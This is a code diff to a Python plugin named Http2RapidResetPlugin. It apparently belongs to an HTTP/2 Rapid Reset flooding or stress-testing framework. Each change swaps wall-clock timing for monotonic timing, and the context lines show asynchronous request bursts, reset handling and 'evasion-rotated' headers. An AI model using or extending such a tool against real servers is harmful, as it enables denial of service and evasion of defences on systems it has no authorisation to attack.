@@ -104,7 +104,7 @@ class Http2RapidResetPlugin(AttackPlugin):
                             break
                         # BUG-007: Use fresh evasion-rotated headers
                         headers = self._get_fresh_headers(context, "api")
-                        t = time.time()
+                        t = time.monotonic()
                         try:
                             # Create the request task
                             task = asyncio.create_task(
@@ -125,13 +125,13 @@ class Http2RapidResetPlugin(AttackPlugin):
                     for task, req_t in tasks:
                         try:
                             await task
-                            rt = time.time() - req_t
+                            rt = time.monotonic() - req_t
                             await self._record("H2-RST", True, 200, rt, url=url[:60])
                         except asyncio.CancelledError:
-                            rt = time.time() - req_t
+                            rt = time.monotonic() - req_t
                             await self._record("H2-RST", True, 0, rt, hint="reset")
                         except (RuntimeError, OSError, ConnectionError) as exc:
-                            rt = time.time() - req_t
+                            rt = time.monotonic() - req_t
                             await self._record("H2-RST", False, 0, rt,
                                                err=type(exc).__name__)
 
@@ -175,17 +175,17 @@ class Http2RapidResetPlugin(AttackPlugin):
                 url = random.choice(pages)
                 # BUG-007: Use fresh evasion-rotated headers
                 headers = self._get_fresh_headers(context, "api")
-                t = time.time()
+                t = time.monotonic()
                 try:
                     async with context.session.get(url, headers=headers,
                                                    ssl=_ssl, allow_redirects=False) as resp:
-                        rt = time.time() - t
+                        rt = time.monotonic() - t
                         ok = resp.status < 500
                         await self._record("H2-RST", ok, resp.status, rt, url=url[:60])
                 except asyncio.CancelledError:
                     raise
                 except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
-                    rt = time.time() - t
+                    rt = time.monotonic() - t
                     await self._record("H2-RST", False, 0, rt,
                                        err=type(exc).__name__)
 
